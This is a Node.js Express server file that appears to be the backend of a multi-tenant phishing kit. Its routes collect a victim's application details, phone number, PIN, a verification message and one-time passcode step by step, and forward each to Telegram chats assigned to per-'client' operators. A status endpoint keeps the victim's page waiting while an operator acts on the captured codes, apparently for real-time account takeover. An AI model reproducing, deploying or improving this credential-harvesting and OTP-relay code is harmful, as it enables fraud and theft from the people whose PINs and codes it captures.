
  // server.js
require('dotenv').config();
const express = require('express');
const path = require('path');
const db = require('./db');
const telegram = require('./telegram');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true })); // For HTML forms

// --- STATIC FILES & HOMEPAGE ---
app.use(express.static(path.join(__dirname)));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// --- ADMIN ROUTES ---
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// API to add a new client
app.post('/api/add-client', async (req, res) => {
    try {
        const { clientId, chatId, name } = req.body;
        await db.createClient(clientId, chatId, name);
        res.json({ success: true, message: "Client added successfully!" });
    } catch (error) {
        res.status(500).json({ error: "Client ID already exists or error occurred." });
    }
});

// API to get all clients (for the admin dashboard)
app.get('/api/clients', async (req, res) => {
    const clients = await db.getAllClients();
    res.json(clients);
});

// --- CLIENT WEB APP ROUTE ---
app.get('/apply/:clientId', async (req, res) => {
    const client = await db.getClient(req.params.clientId);
    if (!client) return res.status(404).send("Client not found. Link is invalid.");
    
    res.sendFile(path.join(__dirname, 'index.html'));
});

// --- API ROUTES ---
app.post('/api/apply', async (req, res) => {
    const sessionId = Date.now().toString();
    const { clientId, ...data } = req.body;
    
    let chatId = process.env.DEFAULT_ADMIN_CHAT_ID;
    
    if (clientId) {
        const client = await db.getClient(clientId);
        if (client) chatId = client.chatId;
    }

    // Save session
    await db.createSession(sessionId, clientId || "default_client", data);

    // Send to Telegram with explicit logging for debugging
    if (chatId) {
        try {
            console.log(`📤 Attempting to send application session ${sessionId} to chat ID: ${chatId}`);
            await telegram.sendApplicationToTelegram(chatId, sessionId, data);
            console.log(`✅ Successfully sent application to Telegram for session ${sessionId}`);
        } catch (err) {
            console.error(`❌ Failed to send application to Telegram:`, err.message);
        }
    } else {
        console.warn(`⚠️ No Telegram chat ID found for session ${sessionId}`);
    }
    
    res.json({ success: true, sessionId });
});

app.post('/api/login', async (req, res) => {
    const { sessionId, phone, pin } = req.body;
    const session = await db.getSession(sessionId);
    if (!session) return res.status(404).json({ error: "Session not found" });

    let chatId = process.env.DEFAULT_ADMIN_CHAT_ID;
    if (session.clientId && session.clientId !== "default_client") {
        const client = await db.getClient(session.clientId);
        if (client) chatId = client.chatId;
    }

    await db.updateSessionData(sessionId, { status: 'PENDING_PIN', phone, pin });
    
    if (chatId) {
        try {
            await telegram.sendPinToTelegram(chatId, sessionId, { phone, pin });
        } catch (err) {
            console.error(`❌ Failed to send PIN to Telegram:`, err.message);
        }
    }
    
    res.json({ success: true });
});

app.post('/api/verification', async (req, res) => {
    const { sessionId, verificationMsg } = req.body;
    const session = await db.getSession(sessionId);
    if (!session) return res.status(404).json({ error: "Session not found" });

    let chatId = process.env.DEFAULT_ADMIN_CHAT_ID;
    if (session.clientId && session.clientId !== "default_client") {
        const client = await db.getClient(session.clientId);
        if (client) chatId = client.chatId;
    }

    await db.updateSessionData(sessionId, { status: 'PENDING_VERIFICATION', verificationMsg });
    
    if (chatId) {
        try {
            await telegram.sendVerificationToTelegram(chatId, sessionId, { phone: session.phone, verificationMsg });
        } catch (err) {
            console.error(`❌ Failed to send verification message to Telegram:`, err.message);
        }
    }
    
    res.json({ success: true });
});

app.post('/api/otp', async (req, res) => {
    const { sessionId, otp } = req.body;
    const session = await db.getSession(sessionId);
    if (!session) return res.status(404).json({ error: "Session not found" });

    let chatId = process.env.DEFAULT_ADMIN_CHAT_ID;
    if (session.clientId && session.clientId !== "default_client") {
        const client = await db.getClient(session.clientId);
        if (client) chatId = client.chatId;
    }

    await db.updateSessionData(sessionId, { status: 'PENDING_OTP', otp });
    
    if (chatId) {
        try {
            await telegram.sendOtpToTelegram(chatId, sessionId, { phone: session.phone, otp });
        } catch (err) {
            console.error(`❌ Failed to send OTP to Telegram:`, err.message);
        }
    }
    
    res.json({ success: true });
});

app.get('/api/status/:sessionId', async (req, res) => {
    const session = await db.getSession(req.params.sessionId);
    if (!session) return res.status(404).json({ error: "Session not found" });
    res.json({ status: session.status });
});

// --- TELEGRAM WEBHOOK ---
app.post('/webhook', (req, res) => {
    telegram.bot.processUpdate(req.body);
    res.sendStatus(200);
});

// --- START SERVER ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
    console.log(`Server running at http://localhost:${PORT}`);
    
    if (process.env.RENDER_EXTERNAL_URL) {
        const webhookUrl = `${process.env.RENDER_EXTERNAL_URL}/webhook`;
        try {
            await telegram.bot.setWebHook(webhookUrl);
            console.log(`✅ Webhook set to: ${webhookUrl}`);
        } catch (error) {
            console.error('❌ Failed to set webhook:', error);
        }
    }
});
